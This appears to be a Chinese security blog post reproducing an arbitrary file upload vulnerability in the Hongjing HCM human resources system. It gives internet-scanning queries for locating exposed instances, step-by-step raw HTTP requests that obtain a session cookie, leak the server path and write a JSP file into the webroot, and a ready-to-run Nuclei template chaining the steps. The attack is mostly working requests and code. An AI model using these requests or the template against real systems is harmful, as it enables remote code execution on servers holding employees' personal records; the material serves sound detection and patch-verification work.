#  【漏洞复现】宏景人力资源信息管理系统uploadLogo任意文件上传   
混子Hacker  混子Hacker   2024-11-09 22:30  
  
****  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不承担任何法律及连带责任。  
  
  
[   
漏洞简介   
]  
  
——    
即使阿迪克斯 达芬喝得烂醉如泥，不像某些人在神智最清醒的时候那般恶毒，世界上是有一些人，他们只顾担心来世根本不去学习今生如何做人，你顺着街道看过去，就知道会有什么样的结果  
 【  
摘自《杀死一只知更鸟》  
】 ——  
  
宏景HCM  
  
宏景HCM  
是一款全面覆盖人力资源管理各模块的软件，主要功能包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训等管理，以及多项业务自助功能  
。该系统  
uploadLogo存在任意文件上传漏洞  
   
  
  
  
  
  
  
漏洞信息  
  
  
  
**混子Hacker**  
  
**01**  
  
资产测绘  
  
  
```
fofa: app="HJSOFT-HCM"
Quake：app:"宏景-HCM"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5owVEIX13BuN1NSnTyibgrmlMus1lsBXXCVqlrc1fiaUI6icibMwmnUk9WRw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5ot9ekwMexyoGfQ5u1Pz9FKTIibliaAo19xYk2ibWmjiayX2eqp8y5slZHmA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**混子Hacker**********  
  
**02**  
  
漏洞复现  
  
  
1、访问  
/module/system/qrcard/mobilewrite/qrcardmain.jsp  
获取cookie  
```
GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
Host: xxx
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5ooibJPbrE34I6Pqs0Bw0rjicCmTpktkqkzwnMvhVTZWTQCxUNtuUYSxag/640?wx_fmt=png&from=appmsg "")  
  
2、携带cookie访问  
  
/sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1  
获取文件上传路径  
```
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryk8DbZoq3wNm32b66
Cookie: JSESSIONID=C2AF006EB0EFAC26070DBC9A6AA10CF8
Accept-Encoding: gzip
Content-Length: 548

------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="path"


------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="lfType"

0
------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

<%= "hjsoft-upload-test" %>
------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

<%= "hjsoft-upload-test" %>
------WebKitFormBoundaryk8DbZoq3wNm32b66--

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5ofmicMHV2vVPp6HdicyEUJSh9vT6mv2Wo4AvyZDWxy4nNbpZibiaEUoAW0Q/640?wx_fmt=png&from=appmsg "")  
  
3、携带cookie和path上传文件  
```
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: xxx
Cookie: JSESSIONID=C2AF006EB0EFAC26070DBC9A6AA10CF8
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Length: 628

------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="path"

D~3a~5capache~2dtomcat~2d~39~2e~30~2e~36~34~2drsxt~5cwebapps~5cROOT~5cthomas.jsp
------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="lfType"

0
------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

<%= "hjsoft-upload-test" %>
------WebKitFormBoundaryk8DbZoq3wNm32b66
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

<%= "hjsoft-upload-test" %>
------WebKitFormBoundaryk8DbZoq3wNm32b66--

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5oTggmCjiaNxHSj8zqcMfURf6TicxObVCr4hicuqZlLgibFtBLxSYWQtPKuw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGuPGFlRM8sK8Uspd2EQYl5o86zomTPwMXYJPKNWUxfiatehhJqkmPvbI2v7327Jp5LdfF6UgHevboA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
**混子Hacker**********  
  
**03**  
  
Nuclei Poc  
  
  
```
id: hjsoft-uploadLogo-fileupload

info:
  name: 宏景uploadLogo任意文件上传漏洞
  author: thomas
  severity: critical
  metadata:
    fofa-query: app="HJSOFT-HCM"
  tags: hjsoft,fileupload

requests:
  - raw:
      - |
        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryk8DbZoq3wNm32b66

        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="path"


        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="lfType"

        0
        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="logofile"; filename=""
        Content-Type: image/gif

        <%= "hjsoft-upload-test" %>
        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="twoFile"; filename=""
        Content-Type: image/gif

        <%= "hjsoft-upload-test" %>
        ------WebKitFormBoundaryk8DbZoq3wNm32b66--
      - |
        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryk8DbZoq3wNm32b66

        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="path"

        {{filepath}}thomas.jsp
        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="lfType"

        0
        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="logofile"; filename=""
        Content-Type: image/gif

        <%= "hjsoft-upload-test" %>
        ------WebKitFormBoundaryk8DbZoq3wNm32b66
        Content-Disposition: form-data; name="twoFile"; filename=""
        Content-Type: image/gif

        <%= "hjsoft-upload-test" %>
        ------WebKitFormBoundaryk8DbZoq3wNm32b66--
      - |
        GET /thomas.jsp HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: cookie
        part: header
        group: 1
        internal: true
        regex:
          - "Set-Cookie: (.*?);"

      - type: regex
        name: filepath
        part: body
        group: 1
        internal: true
        regex:
          - 'value="(.*?)images"'
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200 && contains(body_4, 'hjsoft-upload-test')"
```  
  
  
  
<<<    
END   
>>>  
  
  
  
原创文章｜转载请附上原文出处链接  
  
更多漏洞｜关注作者查看  
  
作者｜混子Hacker  
  
  
  
